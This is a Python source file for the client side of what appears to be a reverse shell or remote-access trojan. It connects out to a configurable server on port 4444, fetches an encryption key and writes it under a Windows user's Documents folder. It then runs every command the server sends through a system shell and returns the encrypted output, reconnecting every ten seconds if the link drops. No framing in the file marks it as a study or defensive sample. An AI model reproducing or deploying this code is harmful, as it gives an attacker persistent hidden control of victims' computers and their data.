import socket
import subprocess
import time
import sys
import os
from crypto_utils import encrypt_message, decrypt_message, generate_key


KEY_PATH = os.path.join(r'C:\Users\User\Documents', 'secret.key')
server_host = '127.0.0.1'# <- EDIT THIS VARIABLE TO NEEDED IP OR DOMAIN OF SERVER 

def request_key(host=server_host):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, 4444))
    client.send(b'REQUEST_KEY')
    key = client.recv(1024)
    with open(KEY_PATH, 'wb') as f:
        f.write(key)
    client.send(b'KEY_RECEIVED')
    client.close()
    return key

try:
    with open(KEY_PATH, 'rb') as f:
        KEY = f.read().strip()
except FileNotFoundError:
    KEY = request_key()
    
def send_result(client, key, result: bytes):

    encrypted_result = encrypt_message(key, result.decode('utf-8', errors='ignore'))
    result_len = len(encrypted_result)
    client.send(f"{result_len:<64}".encode('utf-8'))

    ack = client.recv(1024) 
    if ack == b"OK_SIZE":
        client.sendall(encrypted_result)

def client_listen(host=server_host):

    while True:
        try:

            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, 4444)) 
              
            if os.path.exists(KEY_PATH):
                client.send(b'HELLO')
            else:
                client.send(b'REQUEST_KEY')

            while True:
                try:
                    cmd = decrypt_message(KEY, client.recv(4096))
                    if not cmd:
                        break
                    if cmd.strip() == '':
                        continue
                    if cmd.lower() == 'exit':
                        client.close()
                        sys.exit(0)

                    if cmd.lower() == 'cd':
                        result = f"[+] Current directory: {os.getcwd()}\n".encode('utf-8')
                        send_result(client, KEY, result)
                        
                    elif cmd.lower().startswith('cd '):
                        try:
                            path = cmd[3:].strip()
                            os.chdir(path) 
                            result = f"[+] Directory changed: {os.getcwd()}\n".encode('utf-8')
                        except Exception as e:
                            result = f"[!] Error to change directory: {str(e)}\n".encode('utf-8')

                        send_result(client, KEY, result)

                    else:
                        try:
                            output = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='cp866', timeout=5)
                            result = (output.stdout + output.stderr).encode('utf-8')

                            if not result:
                                result = b'[+] Done\n'

                        except subprocess.TimeoutExpired:
                            result = '[!] Error: Command execution timeout exceeded \n'.encode('utf-8')

                        except Exception as e:
                            result = f'[!] Error execute command: {str(e)}\n'.encode('utf-8')

                        send_result(client, KEY, result)

                except:
                    break

        except (socket.error, ConnectionRefusedError):
            time.sleep(10)
            continue
   
    client.close()
    time.sleep(5)

if __name__ == '__main__':
    client_listen()
